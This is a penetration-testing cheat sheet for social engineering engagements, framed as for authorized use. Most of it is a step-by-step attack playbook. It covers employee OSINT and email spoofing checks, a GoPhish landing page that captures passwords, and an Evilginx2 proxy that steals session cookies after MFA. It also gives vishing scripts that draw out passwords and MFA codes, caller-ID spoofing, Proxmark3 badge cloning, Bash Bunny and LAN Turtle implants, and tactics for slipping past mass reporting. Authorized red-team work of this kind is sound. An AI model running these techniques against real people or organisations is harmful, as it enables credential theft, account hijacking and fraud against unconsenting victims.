# Social Engineering for Authorized Engagements

## OSINT for Targeting
- LinkedIn employee scraping: `theHarvester -d target.com -b linkedin` or manual collection with browser automation
- Email format discovery: test `first.last@target.com`, `flast@target.com` via SMTP VRFY or RCPT TO: `telnet mail.target.com 25` then `VRFY first.last@target.com`
- Hunter.io API: `curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"`
- Org chart mapping: LinkedIn Sales Navigator, search "target.com" filter by department (IT, Finance, HR)
- Document metadata extraction: `exiftool -r -ext pdf -ext docx /path/to/docs/ | grep -i "author\|creator\|email"`
- Google dorking for employees: `site:linkedin.com "target.com" "IT" OR "security" OR "admin"`
- Social media recon: search Twitter/X, GitHub, Reddit for `@target.com` or employee handles
- Breach data check: `curl "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com" -H "hibp-api-key: KEY"`

## Email Spoofing Viability
- Check SPF: `dig TXT target.com | grep spf` — look for `~all` (softfail) or missing SPF
- Check DMARC: `dig TXT _dmarc.target.com` — look for `p=none` or missing DMARC
- Check DKIM: `dig TXT selector._domainkey.target.com`
- If SPF `~all` + DMARC `p=none` = spoofing likely lands in inbox
- If SPF `-all` + DMARC `p=reject` = spoofing will fail, use lookalike domain instead
- Domain lookalike registration: `dnstwist -r target.com` to find available typosquat domains

## Phishing Infrastructure Setup
- GoPhish install: `go install github.com/gophish/gophish@latest` or download release
- GoPhish config: edit `config.json`, set `admin_server` and `phish_server` listen addresses
- Create sending profile: SMTP relay (AWS SES, Mailgun) with SPF/DKIM configured for your phishing domain
- Landing page cloning: `wget -mk https://target.com/login` then import into GoPhish as landing page
- Set data capture on landing page: enable "Capture Submitted Data" and "Capture Passwords" in GoPhish
- Email template: use legitimate target email as base, replace links with GoPhish `{{.URL}}`
- Tracking: GoPhish auto-adds tracking pixel, tracks opens and clicks per user

## Evilginx2 MFA Phishing Proxy
- Install: `go install github.com/kgretzky/evilginx2@latest`
- Configure phishlet: `phishlets hostname TARGET_PHISHLET your-phishing-domain.com` then `phishlets enable TARGET_PHISHLET`
- Create lure: `lures create TARGET_PHISHLET` then `lures get-url LURE_ID`
- Evilginx proxies the real login page, captures session cookies post-MFA
- Extract captured session: `sessions` then `sessions SESS_ID` to get authentication cookies
- Replay session cookie in browser to hijack authenticated session

## QR Code Phishing (Quishing)
- Generate QR code pointing to evilginx URL: `qrencode -o phish.png "https://phishing-domain.com/lure"`
- Embed in email as image attachment to bypass URL scanners
- Physical QR codes: print and place over legitimate QR codes at target location
- Wi-Fi QR codes: create QR connecting to rogue AP for credential capture

## Vishing (Voice Phishing)
- Pretext development: IT helpdesk calling about "security incident", HR calling about "benefits enrollment"
- Caller ID spoofing: use SIPVicious or SpoofCard to display target's internal number
- Credential elicitation script: "We're resetting passwords due to a breach, I need to verify your current password before I can issue the new one"
- MFA code elicitation: "I'm sending you a verification code to confirm your identity" (real-time relay to target login)
- Record calls (where legally permitted) for evidence in engagement report
- Pretexts that work: urgent security incident, new employee onboarding verification, benefits deadline, CEO impersonation for wire transfer

## Physical Social Engineering
- Badge cloning: use Proxmark3 to read HID iClass/Prox cards at 1-2 feet: `lf hid reader` then `lf hid clone -r FACILITY:CARDNO`
- Tailgating: follow employee through badge-controlled door, carry boxes or coffee
- Drop devices: plant Bash Bunny (`ATTACKMODE HID STORAGE`, payload exfiltrates creds) or LAN Turtle (inline network implant with reverse SSH)
- USB drop attack: scatter USB drives in parking lot with autorun payload or disguised as keyboard (Rubber Ducky)
- Lock bypass: use under-door tool, shim padlocks, bypass push-bar with wire, check for REX sensors
- Dumpster diving: retrieve printed documents, sticky notes with passwords, discarded hardware

## Campaign Management
- Send phishing in waves: 20% of targets first, wait 2 hours, send remaining to avoid mass reporting
- Monitor GoPhish dashboard for opens, clicks, and credential submissions in real-time
- Rotate sending infrastructure if emails start bouncing (IP reputation)
- Use URL shorteners or redirect chains to obscure phishing domain in email body
- Test email delivery to personal inbox first before campaign launch
- After credential capture: validate credentials immediately, document access level achieved
- Cleanup: remove phishing infrastructure, rotate any captured credentials, notify client of compromised accounts

## Reporting Tips
- Document every pretext, email template, and target selection rationale
- Include click rates, credential submission rates, and time-to-first-click metrics
- Screenshot captured credentials (redacted) and session hijack proof
- Provide awareness training recommendations based on which pretexts succeeded
- Categorize results: clicked link only, submitted credentials, submitted credentials + MFA token
